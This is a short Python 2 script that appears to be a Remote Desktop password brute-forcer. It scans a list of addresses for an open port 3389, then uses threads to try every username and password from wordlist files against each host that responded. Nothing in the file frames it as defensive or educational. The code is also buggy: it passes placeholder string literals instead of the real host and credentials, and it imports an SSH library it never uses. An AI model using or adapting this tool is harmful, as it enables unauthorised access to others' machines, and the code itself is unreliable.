import threading
import Queue
import paramiko
import os
import sys
import socket 
from connect import *
#q = Queue.Queue()

def run(host, user, passwd):
    print ('[+] Try %s user %s passwd %s ' %(host,user,passwd)) 
    try:
        res = mytest('host','3389','user','passwd')
    except Exception:
        res = {"connected": False}

    print res


def worker(address):
    while True:
        li = q.get()
        # print li[0]
        run(address, li[0], li[1])
        q.task_done()

def main():
    #ip = sys.argv[3]
    #users = sys.argv[1]
    #passwd = sys.argv[2]
    #for address in black:
    #ip = '127.0.0.1'
    ssh_passwd = []
    ssh_users = []
    fusers = open('users.txt','r')
    for i in fusers.readlines():
        user = i.strip('\n')
        ssh_users.append(user)
    print ssh_users
    fpass = open('passwd.txt','r')
    for line in fpass.readlines():
        passwd = line.strip('\n')
        ssh_passwd.append(passwd)
    print ssh_passwd
    fpass.close()
    threads = 1
    for address in black:
        global q
        q = Queue.Queue()
        for i in range(threads):
            t = threading.Thread(target=worker, args=(address, ))
            t.setDaemon(True)
            t.start()
        for user in ssh_users:
            for passwd in ssh_passwd:
                q.put((user, passwd))

        q.join()
        print 'exit!!!'

if __name__ == '__main__':
    ##check 3389portopen ##
  port=3389 
  add = []
  black = []
  f_address = open('address.txt','r')
  for i in f_address.readlines():
    address = i.strip('\n')
    add.append(address)
  print add
  for address in add:
    s=socket.socket()
    try: 
      s.connect((address,port)) 
      print address
      black.append(address)
    except socket.error,e: 
      print 'Error OR Port Not Opened'
  print black
  for address in black:
    print address
  main()
